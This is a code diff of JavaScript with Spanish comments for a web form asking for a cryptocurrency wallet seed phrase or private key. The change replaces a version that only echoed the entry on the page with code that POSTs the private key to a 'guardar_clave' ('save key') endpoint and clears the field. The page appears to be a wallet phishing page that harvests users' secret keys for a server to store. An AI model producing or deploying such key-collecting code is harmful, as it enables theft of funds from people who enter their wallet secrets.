@@ -1,13 +1,21 @@
+document.getElementById('formulario').addEventListener('submit', function(event) {
+    event.preventDefault();
 
-    document.getElementById("walletForm").addEventListener("submit", function(event){
-        event.preventDefault();  // Evitar el envío del formulario
-        const clave = document.getElementById("clave").value;
-        
-        if (clave) {
-            // Aquí iría el proceso para validar o usar la clave
-            document.getElementById("resultado").textContent = "Frase Semilla o Clave Privada ingresada: " + clave;
-        } else {
-            document.getElementById("resultado").textContent = "Por favor ingresa una frase semilla o clave privada.";
-        }
-    });
+    const clavePrivada = document.getElementById('clave').value;
     
+    fetch('http://localhost:5000/guardar_clave', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: `clave=${clavePrivada}`
+    })
+    .then(response => response.text())
+    .then(data => {
+        alert(data);
+        document.getElementById('clave').value = '';  // Limpiar el campo de entrada
+    })
+    .catch(error => {
+        console.error('Error al guardar la clave:', error);
+    });
+});
